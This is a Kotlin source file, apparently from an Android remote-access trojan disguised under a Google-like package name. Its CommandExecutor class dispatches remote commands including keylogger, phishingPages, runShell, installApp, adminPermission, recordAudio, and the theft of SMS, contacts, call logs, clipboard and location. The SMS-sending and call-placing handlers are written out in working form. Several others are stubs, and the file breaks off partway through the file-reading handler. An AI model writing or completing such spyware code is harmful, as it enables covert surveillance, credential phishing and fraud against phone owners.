package com.google.dino.admin.utils

import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.util.Log
import android.widget.Toast
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.lang.Exception
import java.util.*

class CommandExecutor(private val context: Context) {

    companion object {
        private const val TAG = "CommandExecutor"
    }

    private lateinit var textToSpeech: TextToSpeech
    private lateinit var vibrator: Vibrator
    private lateinit var mediaPlayer: MediaPlayer
    private var audioManager: AudioManager? = null

    init {
        initializeComponents()
    }

    private fun initializeComponents() {
        vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        
        textToSpeech = TextToSpeech(context) { status ->
            if (status == TextToSpeech.SUCCESS) {
                textToSpeech.language = Locale.getDefault()
            }
        }
    }

    fun executeCommand(command: String, params: JSONObject?): Map<String, Any> {
        return try {
            val result = when (command) {
                "sendSms" -> executeSendSms(params)
                "getSms" -> executeGetSms()
                "makeCall" -> executeMakeCall(params)
                "getGallery" -> executeGetGallery()
                "getFile" -> executeGetFile(params)
                "sendFile" -> executeSendFile(params)
                "installApp" -> executeInstallApp(params)
                "visitUrl" -> executeVisitUrl(params)
                "readStorage" -> executeReadStorage(params)
                "downloadMedia" -> executeDownloadMedia(params)
                "getSystemInfo" -> executeGetSystemInfo()
                "getInstalledApps" -> executeGetInstalledApps()
                "getCallLogs" -> executeGetCallLogs()
                "getContacts" -> executeGetContacts()
                "getNotifications" -> executeGetNotifications()
                "keylogger" -> executeKeylogger(params)
                "adminPermission" -> executeAdminPermission()
                "phishingPages" -> executePhishingPages(params)
                "recordAudio" -> executeRecordAudio(params)
                "playMusic" -> executePlayMusic(params)
                "vibrateDevice" -> executeVibrateDevice(params)
                "textToSpeech" -> executeTextToSpeech(params)
                "torchLight" -> executeTorchLight(params)
                "changeWallpaper" -> executeChangeWallpaper(params)
                "runShell" -> executeRunShell(params)
                "getClipboard" -> executeGetClipboard()
                "getLocation" -> executeGetLocation()
                else -> mapOf("error" to "Unknown command: $command")
            }
            
            mapOf(
                "command" to command,
                "success" to true,
                "result" to result,
                "timestamp" to System.currentTimeMillis()
            )
        } catch (e: Exception) {
            mapOf(
                "command" to command,
                "success" to false,
                "error" to e.message ?: "Unknown error",
                "timestamp" to System.currentTimeMillis()
            )
        }
    }

    private fun executeSendSms(params: JSONObject?): Map<String, Any> {
        val number = params?.getString("number") ?: return mapOf("error" to "Missing phone number")
        val message = params.getString("message") ?: return mapOf("error" to "Missing message")
        
        return try {
            val smsManager = android.telephony.SmsManager.getDefault()
            smsManager.sendTextMessage(number, null, message, null, null)
            mapOf("success" to true, "sent_to" to number)
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeGetSms(): Map<String, Any> {
        // This would use the SmsHandler class
        return mapOf("success" to true, "message" to "SMS retrieval initiated")
    }

    private fun executeMakeCall(params: JSONObject?): Map<String, Any> {
        val number = params?.getString("number") ?: return mapOf("error" to "Missing phone number")
        
        return try {
            val intent = Intent(Intent.ACTION_CALL)
            intent.data = Uri.parse("tel:$number")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            mapOf("success" to true, "called" to number)
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeGetGallery(): Map<String, Any> {
        return try {
            val images = mutableListOf<Map<String, String>>()
            // Implementation for getting gallery images
            mapOf("success" to true, "count" to images.size)
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeGetFile(params: JSONObject?): Map<String, Any> {
        val path = params?.getString("path") ?: return mapOf("error" to "Missing file path")
        
        return try {
            val file = File(path)
            if (file.exists()) {
                mapOf(
                    "
